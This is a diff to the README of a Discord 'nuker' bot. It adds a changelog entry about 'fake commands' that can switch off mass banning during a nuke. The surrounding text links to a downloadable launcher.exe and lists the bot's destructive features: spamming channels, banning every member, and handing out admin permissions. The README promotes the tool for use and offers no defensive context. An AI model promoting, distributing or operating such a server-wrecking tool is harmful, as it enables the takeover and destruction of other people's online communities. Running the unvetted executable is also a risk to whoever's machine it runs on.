@@ -1,7 +1,11 @@
 # Discord Five nuker bot | Download [here](https://github.com/glitch65/Discord-Five-nuker-bot/raw/launcher/launcher.exe)
 
+# if you have any problems with the bot, write to me on the discord server or create an issue
+# how to use the fake command system is written in my discord server
 
 # Changelog:
+> v3.2 added a system of fake commands, now you can disable the ban of all server members when nuke
+
 > v3.1 added new nuker mode
 
 > v3.0 added launcher for .exe version of nuker
@@ -38,6 +42,8 @@
 4. Spam in Spam channels with custom massage
 5. Ban everyone with custom reason
 6. Give you (or everyone on the server) admin perms
+
+
 
 # Like my bot? then add a star to my repository and join my discord server so you support me and help promote the bot  
 
